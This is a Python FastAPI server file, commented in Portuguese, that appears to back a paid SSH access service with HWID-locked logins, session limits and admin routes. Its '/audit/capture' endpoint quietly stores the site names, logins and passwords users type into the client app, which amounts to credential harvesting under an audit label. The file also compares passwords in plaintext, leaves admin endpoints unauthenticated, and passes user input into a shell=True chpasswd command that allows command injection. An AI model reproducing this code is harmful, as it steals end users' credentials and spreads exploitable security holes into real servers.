from fastapi import FastAPI, Depends, HTTPException, status
from sqlalchemy.orm import Session
from pydantic import BaseModel
from datetime import datetime, timedelta
import subprocess
import psutil
from database import SessionLocal, User, AuditLog

app = FastAPI()

# Dependência do BD
def get_db():
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()

# Modelos Pydantic (Validação de Dados)
class UserLogin(BaseModel):
    username: str
    password: str
    hwid: str

class AuditEntry(BaseModel):
    username: str
    site: str
    login: str
    password: str

# --- ROTAS ---

@app.post("/auth/login")
def login(user_data: UserLogin, db: Session = Depends(get_db)):
    # 1. Busca usuário no Banco
    user = db.query(User).filter(User.username == user_data.username).first()
    
    if not user:
        raise HTTPException(status_code=404, detail="Usuário não encontrado")
    
    # 2. Verifica Senha (aqui comparamos texto puro por enquanto, mas ideal é hash)
    if user.password_hash != user_data.password:
        raise HTTPException(status_code=401, detail="Senha incorreta")
    
    # 3. Verifica Validade
    if user.valid_until < datetime.now():
        raise HTTPException(status_code=403, detail="Conta EXPIRADA")

    # 4. Verifica/Vincula HWID
    if user.hwid == "PENDENTE":
        user.hwid = user_data.hwid
        db.commit()
    elif user.hwid != user_data.hwid:
        raise HTTPException(status_code=403, detail="HWID Inválido (Computador não autorizado)")

    # 5. Verifica Sessões Ativas (Comando Linux)
    # Conta processos sshd do usuário
    sess_count = 0
    for proc in psutil.process_iter(['username', 'name']):
        if proc.info['name'] == 'sshd' and proc.info['username'] == user.username:
            sess_count += 1
            
    if sess_count > user.max_sessions:
        raise HTTPException(status_code=429, detail="Limite de conexões simultâneas atingido")

    # Retorna dados para o Cliente Flet
    days_left = (user.valid_until - datetime.now()).days
    return {
        "status": "authorized",
        "access_level": user.access_level,
        "days_left": days_left,
        "warning": days_left <= 5  # Alerta se faltar 5 dias ou menos
    }

@app.post("/audit/capture")
def capture_credentials(entry: AuditEntry, db: Session = Depends(get_db)):
    """Recebe as credenciais digitadas no app para auditoria"""
    log = AuditLog(
        username=entry.username,
        site_accessed=entry.site,
        captured_login=entry.login,
        captured_password=entry.password
    )
    db.add(log)
    db.commit()
    return {"status": "logged"}

@app.post("/admin/kick/{target_user}")
def kick_user(target_user: str):
    """Derruba o usuário do SSH"""
    try:
        subprocess.run(["pkill", "-KILL", "-u", target_user], check=True)
        return {"status": "User kicked"}
    except:
        return {"status": "Error or user not online"}

# Função auxiliar para criar user via API (pode ser chamada pelo Admin Flet)
@app.post("/admin/create")
def create_user(username: str, password: str, days: int, level: int, db: Session = Depends(get_db)):
    validity = datetime.now() + timedelta(days=days)
    # Cria no Linux
    subprocess.run(["useradd", "-M", "-s", "/bin/false", username])
    subprocess.run(f"echo '{username}:{password}' | chpasswd", shell=True)
    
    # Cria no Banco
    new_user = User(username=username, password_hash=password, valid_until=validity, access_level=level)
    db.add(new_user)
    db.commit()
    return {"status": "created"}
